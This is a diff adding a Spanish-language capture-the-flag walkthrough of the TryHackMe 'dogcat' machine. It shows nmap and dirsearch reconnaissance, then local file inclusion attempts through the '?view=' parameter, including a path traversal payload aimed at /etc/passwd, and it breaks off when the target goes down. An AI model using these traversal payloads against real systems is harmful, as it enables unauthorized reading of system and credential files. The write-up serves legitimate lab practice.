@@ -1,1 +1,86 @@
 #dogcat walkthrough
+#Los cambios de ip en la máquina se deben a que la he completado en varios días, o al reinicio de la misma.
+
+Comienzo con un escaneo de puertos -p- para escanearlos todos.
+
+sudo nmap -p- 10.130.149.99
+[sudo] contraseña para mksk:     
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-08-18 12:03 CEST
+Nmap scan report for 10.130.149.99
+Host is up (0.032s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 15.47 seconds
+
+CTF web, hasta aqui la enumeración de puertos, voy al 80.
+
+Una página para ver fotos de gatos o perros.
+Me llama la atención como se pasa lo que quiero ver por url.
+
+http://10.130.149.99/?view=dog
+
+Antes de seguir por ahi, voy a enumerar subdirectorios, por si encuentro algo.
+
+//Últimamente Tryhackme tiene algunos problemas con la red, y las máquinas paran de responder al tráfico tras un par de minutos, voy a tener que reiniciarla varias veces durante el walkthrough.
+
+Ahora si, enumero.
+
+sudo dirsearch -u http://10.128.185.252
+/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
+  from pkg_resources import DistributionNotFound, VersionConflict
+
+  _|. _ _  _  _  _ _|_    v0.4.3
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
+
+Output File: /home/mksk/reports/http_10.128.185.252/_26-08-18_12-09-33.txt
+
+Target: http://10.128.185.252/
+
+[12:09:33] Starting: 
+[12:09:36] 403 -  279B  - /.htaccess.bak1
+[12:09:36] 403 -  279B  - /.ht_wsr.txt
+[12:09:36] 403 -  279B  - /.htaccess.orig
+[12:09:36] 403 -  279B  - /.htaccess.sample
+[12:09:36] 403 -  279B  - /.htaccess_extra
+[12:09:36] 403 -  279B  - /.htaccess.save
+[12:09:36] 403 -  279B  - /.htaccess_sc
+[12:09:36] 403 -  279B  - /.htaccessOLD2
+[12:09:36] 403 -  279B  - /.htaccessBAK
+[12:09:36] 403 -  279B  - /.htaccess_orig
+[12:09:36] 403 -  279B  - /.htaccessOLD
+[12:09:36] 403 -  279B  - /.html
+[12:09:36] 403 -  279B  - /.htm
+[12:09:36] 403 -  279B  - /.htpasswd_test
+[12:09:36] 403 -  279B  - /.httr-oauth
+[12:09:36] 403 -  279B  - /.htpasswds
+[12:09:48] 200 -    0B  - /flag.php
+[12:09:58] 403 -  279B  - /server-status/
+[12:09:58] 403 -  279B  - /server-status
+
+Task Completed
+
+Bueno, pues aparece flag.php.
+Pero esta vacía.
+
+Voy a continuar con la url.
+
+Pruebo LFI.
+http://10.128.185.252/?view=/etc/passwd
+
+Y aparece un mensaje de error.  Sorry, only dogs or cats are allowed. 
+
+Modifico my payload y vuelvo a probar.
+
+http://10.128.185.252/?view=cat/../../etc/passwd
+
+Here you go!
+Warning: include(cat/../../etc/passwd.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 24
+
+Warning: include(): Failed opening 'cat/../../etc/passwd.php' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on line 24.
+
+//Se ha vuelto a caer la máquina.
